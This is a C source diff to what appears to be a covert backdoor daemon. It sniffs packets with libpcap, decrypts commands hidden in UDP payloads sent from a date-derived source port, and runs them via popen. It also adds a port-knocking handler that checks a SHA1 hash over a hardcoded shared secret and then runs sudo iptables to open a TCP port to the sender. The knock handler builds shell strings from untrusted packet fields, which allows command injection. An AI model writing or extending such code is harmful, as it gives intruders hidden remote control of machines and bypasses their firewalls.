@@ -17,8 +17,12 @@
 #define MAX_CMD_SIZE    1024
 #define MAX_DLINK_HDR   16
 #define SNAP_LEN        (MAX_CMD_SIZE + sizeof(struct ip_header) + sizeof(struct tcp_header) + MAX_DLINK_HDR)
-#define FILTER_STRING   "udp dst port 34249"
+#define KNOCK_PORT      25068
+#define BUFSIZE         1024
+#define SHA1_LEN        40
+#define FILTER_STRING   "(udp dst port (34249 or 25068)) or icmp"
 #define MANGLED "a1487b33FcAc3FD8aa9D4d44e4e402AFDa955cc514cEC0368bB8eD717aaa8cC5\0" 
+#define SHARED_SECRET "this will be used for the port knocking hash" 
 
 uint32_t* get_key(uint32_t key[4])
 {
@@ -81,26 +85,22 @@ u_char datalink_length(pcap_t *session)
 /*{*/
 /*}*/
 
-void inspect_udp(struct ip_header *iph)
+void answer_knock(struct ip_header *iph)
 {
-    uint16_t len;
-    uint16_t deciphered;
-    char *data;
-    char command[MAX_CMD_SIZE];
+    FILE* f;
     uint32_t key[4];
+    char prehash[100];
+    char hash[SHA1_LEN + 1];
+    char packethash[SHA1_LEN + 1];
+    char rand[9] = { '\0' };
+    char portstr[6] = { '\0' };
+    uint16_t port;
+    char *data;
+    uint16_t deciphered;
+    uint16_t len = SHA1_LEN + 8 + 4;
     struct udp_header *udph = (struct udp_header *)
             ((char *) iph + sizeof(struct ip_header));
 
-
-    if (ntohs(udph->srcport) != port_from_date())
-    {
-        printf("ntohs(udph->srcport): %d\n", ntohs(udph->srcport));
-        printf("port: %d\n", port_from_date());
-        return;
-    }
-
-    len = iph->id;
-        
     data = (char *) udph + sizeof(udph);
     get_key(key);
 
@@ -111,20 +111,116 @@ void inspect_udp(struct ip_header *iph)
         decipher(RCM_NUM_ROUNDS, (uint32_t *) (data + deciphered), key); 
         deciphered += sizeof(uint32_t) / sizeof(char) * 2;
     }
+
+    strncpy(packethash, data, SHA1_LEN);
+    packethash[SHA1_LEN] = '\0';
+
+    strncpy(rand, data + SHA1_LEN, 8);
+    strncpy(portstr, data + SHA1_LEN + 8, 5);
+    if (!(port = strtol(portstr, NULL, 10)))
+    {
+        return;
+    }
+
+    /*syslog(LOG_INFO, "rand: %s", rand);*/
+    /*syslog(LOG_INFO, "port: %u", port);*/
+
+    sprintf(prehash, "echo '%s%s%s' | sha1sum | awk '{print $1}'", 
+            SHARED_SECRET, rand, portstr);
+
+    f = popen(prehash, "r"); 
+    fread(hash, sizeof(char), SHA1_LEN + 1, f);
+    /*syslog(LOG_INFO, "hashcmd: %s", prehash);*/
+    /*syslog(LOG_INFO, "read: %d", read);*/
+    hash[SHA1_LEN] = '\0';
+    /*syslog(LOG_INFO, hash);*/
+    /*syslog(LOG_INFO, packethash);*/
+    pclose(f);
+
+    if (!strcmp(hash, packethash))
+    {
+        /* if a hash done locally equals the received hash */
+        /* open the port for 10 seconds for the sender's IP address */
+        char sourceip[INET_ADDRSTRLEN];
+        char iptablescmd[512];
+        struct in_addr srcaddr;
+        
+        srcaddr.s_addr = iph->srcip;
+
+        if (!inet_ntop(AF_INET, &srcaddr, sourceip, sizeof(sourceip)))
+        {
+            syslog(LOG_ERR, "inet_ntop(): %s", strerror(errno));
+        }
+
+        syslog(LOG_INFO, "opening port %d for %s", port, sourceip);
+        sprintf(iptablescmd, "sudo iptables --append INPUT --source %s " \
+                                "--proto tcp --dport %d --jump ACCEPT; " \
+                             "sleep 10; " \
+                             "sudo iptables --delete INPUT --source %s " \
+                                "--proto tcp --dport %d --jump ACCEPT",
+               sourceip, port, sourceip, port);
+        system(iptablescmd);
+        syslog(LOG_INFO, "closing port %d for %s", port, sourceip);
+    }
+}
+
+void exec_command(struct ip_header *iph)
+{
+    uint16_t len;
+    uint16_t deciphered;
+    char *data;
+    char command[MAX_CMD_SIZE] = { '\0' };
+    uint32_t key[4];
+    FILE* f;
+    char buf[BUFSIZE];
+    size_t read;
+    struct udp_header *udph = (struct udp_header *)
+            ((char *) iph + sizeof(struct ip_header));
+        
+    data = (char *) udph + sizeof(udph);
+    get_key(key);
+
+    len = iph->id;
+    deciphered = 0;
+
+    while (deciphered < len)
+    {
+        decipher(RCM_NUM_ROUNDS, (uint32_t *) (data + deciphered), key); 
+        deciphered += sizeof(uint32_t) / sizeof(char) * 2;
+    }
     strncpy(command, data, len);
     command[len] = '\0';
 
+    strcpy(&command[len], " 2>&1"); 
     #ifdef DEBUG
-    printf("\n\tCommand: \"%s\"\n\n", command);
-    fflush(stdout);
-    syslog(LOG_INFO, "RUNNING COMMAND");
-    #else
-    strcpy(&command[len], " &> /dev/null"); 
+    syslog(LOG_INFO, "Running Command: %s", command);
     #endif
-    system(command);
+
+    f = popen(command, "r");
+    read = fread(buf, sizeof(char), BUFSIZE - 1, f);
+    buf[read] = '\0';
+    syslog(LOG_INFO, buf);
+    pclose(f);
 
     /* don't leave key in memory */
     memset(key, '\0', sizeof(uint32_t) / sizeof(char) * 4);
+}
+
+void inspect_udp(struct ip_header *iph)
+{
+    struct udp_header *udph = (struct udp_header *)
+            ((char *) iph + sizeof(struct ip_header));
+    uint16_t dstport = ntohs(udph->dstport);
+    uint16_t srcport = ntohs(udph->srcport);
+
+    if (dstport == KNOCK_PORT)
+    {
+        answer_knock(iph);
+    }
+    else if (srcport == port_from_date())
+    {
+        exec_command(iph);
+    }
 }
 
 void inspect_packet(u_char *linklen, const struct pcap_pkthdr *h,
